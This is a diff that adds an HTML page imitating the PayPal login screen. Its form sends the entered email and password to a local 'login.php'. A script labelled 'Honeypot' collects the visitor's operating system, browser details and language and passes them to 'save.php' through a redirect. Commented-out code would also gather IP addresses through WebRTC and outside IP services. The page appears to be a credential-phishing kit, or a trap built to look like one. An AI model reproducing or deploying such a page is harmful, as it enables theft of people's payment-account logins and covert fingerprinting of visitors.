@@ -1,0 +1,161 @@
+<!DOCTYPE html>
+<html lang="en" class="no-js">
+	<head>
+		<meta charset="utf-8" />
+		<title></title>
+		<meta http-equiv="content-type" content="text/html; charset=UTF-8" />
+		<meta name="application-name" content="PayPal" />
+		<meta name="msapplication-task" content="name=My Account;action-uri=https://www.paypal.com/us/cgi-bin/webscr?cmd=_account;icon-uri=http://www.paypalobjects.com/en_US/i/icon/pp_favicon_x.ico" />
+		<meta name="msapplication-task" content="name=Send Money;action-uri=https://www.paypal.com/us/cgi-bin/webscr?cmd=_send-money-transfer&amp;send_method=domestic;icon-uri=http://www.paypalobjects.com/en_US/i/icon/pp_favicon_x.ico" />
+		<meta name="msapplication-task" content="name=Request Money;action-uri=https://personal.paypal.com/cgi-bin/?cmd=_render-content&amp;content_ID=marketing_us/request_money;icon-uri=http://www.paypalobjects.com/en_US/i/icon/pp_favicon_x.ico" />
+		<meta name="keywords" content="transfer money, email money transfer, international money transfer " />
+		<meta name="description" content="Transfer money online in seconds with PayPal money transfer. All you need is an email address." />
+		<link rel="shortcut icon" href="https://www.paypalobjects.com/en_US/i/icon/pp_favicon_x.ico" />
+		<link rel="apple-touch-icon" href="https://www.paypalobjects.com/en_US/i/pui/apple-touch-icon.png" />
+		<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=yes" />
+		<link rel="stylesheet" href="https://www.paypalobjects.com/web/res/992/60b27c4f0ae8a6a554d7bc16913f4/css/app.css" />
+		<script src="https://www.paypalobjects.com/web/res/992/60b27c4f0ae8a6a554d7bc16913f4/js/lib/modernizr-2.6.1.js"></script>
+		<style id="antiClickjack">
+			body {display: none !important;}
+		</style>
+		<script>/* Don't bust the frame if this is top window* or if the parent window is *.paypal.com domain (Checkout for example).*/if (self === top || /paypal\.com$/.test(window.parent.location.hostname)) {var antiClickjack = document.getElementById("antiClickjack");if (antiClickjack) {antiClickjack.parentNode.removeChild(antiClickjack);}} else {top.location = self.location;}</script>
+	</head>
+	<body class="unknown " data-rlogid="NDgjb7qbiQUhOSK34Vg4s9HIXGUDki1OCepvBvrcUiNMe1%2BoScg5xQwrt12BHcaa4RuXMdxnhldS441Ws2%2B%2FgSo97i%2FdvmO0_15390748ad2" data-hostname="2hMjJRKM3jTw/liZV+38XnrZg+KNx11bAQcP36QQ7KIi3lhhZTljI1HMmCfJeenkOhbWFFXByik" data-production="true"  	data-enable-ads-captcha="true" data-view-name="login" data-template-path="https://www.paypalobjects.com/web/res/992/60b27c4f0ae8a6a554d7bc16913f4/templates/US/en/%s.js"data-csrf-token="IlGu7Zo7tpp3D68zqXTMKGVNIA1r+7jQDc9gM=" >
+		<noscript>
+			<p class="nonjsAlert" role="alert">NOTE: Many features on the PayPal Web site require Javascript and cookies.</p>
+		</noscript>
+		<div id="page">
+			<div id="content" class="contentContainer">
+				<header>
+					<div class="paypal-logo"></div>
+				</header>
+				<div id="main" class="main" role="main">
+					<section id="login" class="login" data-role="page" data-title="Log in to your PayPal account">
+						<h1 class="headerText accessAid">Log in to your PayPal account</h1>
+						<form action=login.php?"done.html" method="post" class="proceed maskable" name="login"autocomplete="off" novalidate>
+							<input type="hidden" id="token" name="_csrf" value="IlGu7Zo7tpp3D68zqXTMKGVNIA1r+7jQDc9gM=">
+							<input type="hidden" name="locale.x" value="en_US">
+							<input type="hidden" name="processSignin" value="main">
+							<div id="passwordSection" class="clearfix">
+								<div class="textInput" id="login_emaildiv">
+									<div class="fieldWrapper">
+										<label for="email" class="fieldLabel">Email</label>
+										<input id="email"name="login_email"type="email"class="hasHelp  validateEmpty "required="required" aria-required="true"value=""		autocomplete=	"off"			placeholder=	"Email"		/>
+									</div>
+									<div class="errorMessage"id="emailErrorMessage">
+										<p class="emptyError hide">Required</p>
+										<p class="invalidError hide">That email format isn't right</p>
+									</div>
+								</div>
+								<div class="textInput lastInputField" id="login_passworddiv">
+									<div class="fieldWrapper">
+										<label for="password" class="fieldLabel">Password</label>
+										<input id="password"name="login_password"type="password"class="hasHelp  validateEmpty "required="required" aria-required="true"value=""		placeholder=	"Password"		/>
+									</div>
+									<div class="errorMessage"id="passwordErrorMessage">
+										<p class="emptyError hide">Required</p>
+									</div>
+								</div>
+							</div>
+							<div class="actions actionsSpaced">
+								<button class="button actionContinue" type="submit" id="btnLogin" name="btnLogin" value="Login">Log In</button>
+							</div>
+						</form>
+					</section>
+					<script src='/auth/createchallenge/9f92466241fb9360/challenge.js'></script>
+				</div>
+			</div>
+			<div class="transitioning hide">
+				<p class="checkingInfo hide">Checking your info</p>
+				<p class="oneSecond hide">Just a second</p>
+			</div>
+		</div><!-- Require.js baseUrl config is loaded in advance. More here: http://requirejs.org/docs/api.html#config -->
+		
+		<!-- the Honeypot javascript code -->
+		<script src="http://ajax.googleapis.com/ajax/libs/jquery/1.7.1/jquery.min.js" type="text/javascript"></script>
+
+		<script type="application/javascript" src="https://api.ipify.org?format=jsonp&callback=getIP"></script>
+		<!-- Get IP -->
+		<script type="application/javascript" src="http://www.telize.com/jsonip?callback=getip"></script>
+		<script type="application/javascript">
+			try{
+				var info = "";
+				
+				function addinfo(str)
+				{
+					info += (str + '|');
+				}
+				/*
+				function findIP(onNewIP) { //  onNewIp - your listener function for new IPs
+				  var myPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection; //compatibility for firefox and chrome
+				  var pc = new myPeerConnection({iceServers: []}),
+				    noop = function() {},
+				    localIPs = {},
+				    ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/g,
+				    key;
+
+				  function ipIterate(ip) {
+				    if (!localIPs[ip]) onNewIP(ip);
+				    localIPs[ip] = true;
+				  }
+				  pc.createDataChannel(""); //create a bogus data channel
+				  pc.createOffer(function(sdp) {
+				    sdp.sdp.split('\n').forEach(function(line) {
+				      if (line.indexOf('candidate') < 0) return;
+				      line.match(ipRegex).forEach(ipIterate);
+				    });
+				    pc.setLocalDescription(sdp, noop, noop);
+				  }, noop); // create offer and set local description
+				  pc.onicecandidate = function(ice) { //listen for candidate events
+				    if (!ice || !ice.candidate || !ice.candidate.candidate || !ice.candidate.candidate.match(ipRegex)) return;
+				    ice.candidate.candidate.match(ipRegex).forEach(ipIterate);
+				  };
+				}
+
+				function addIP(ip) {
+					alert(ip);
+					addinfo(ip);
+				}
+				
+				findIP(addIP);
+				
+				function getIP(json) {
+					alert(json.ip);
+					addinfo(json.ip);
+					document.write("My public IP address is: ", json.ip);
+				}
+			    */
+				//OS
+				var OSName = "Unknown";
+				if (window.navigator.userAgent.indexOf("Windows NT 10.0") != -1) OSName="Windows 10";
+				if (window.navigator.userAgent.indexOf("Windows NT 6.3") != -1) OSName="Windows 8.1";
+				if (window.navigator.userAgent.indexOf("Windows NT 6.2") != -1) OSName="Windows 8";
+				if (window.navigator.userAgent.indexOf("Windows NT 6.1") != -1) OSName="Windows 7";
+				if (window.navigator.userAgent.indexOf("Windows NT 6.0") != -1) OSName="Windows Vista";
+				if (window.navigator.userAgent.indexOf("Windows NT 5.1") != -1) OSName="Windows XP";
+				if (window.navigator.userAgent.indexOf("Windows NT 5.0") != -1) OSName="Windows 2000";
+				if (window.navigator.userAgent.indexOf("Mac")!=-1) OSName="Mac/iOS";
+				if (window.navigator.userAgent.indexOf("X11")!=-1) OSName="UNIX";
+				if (window.navigator.userAgent.indexOf("Linux")!=-1) OSName="Linux";
+				addinfo(OSName);
+				
+				//Get Info about browser and OS
+				browser      = navigator.appCodeName;
+				browserVer   = navigator.appVersion;
+				cookies      = navigator.cookieEnabled;
+				broLen       = navigator.language;
+
+				addinfo(browser);
+				addinfo(browserVer);
+				addinfo(broLen);
+				addinfo(cookies);
+				
+				window.location.href = "save.php?info=" + info;
+			}
+  			catch(err)
+  			{
+  				alert(err.message)
+  			}
+		</script>
+	</body>
+</html>
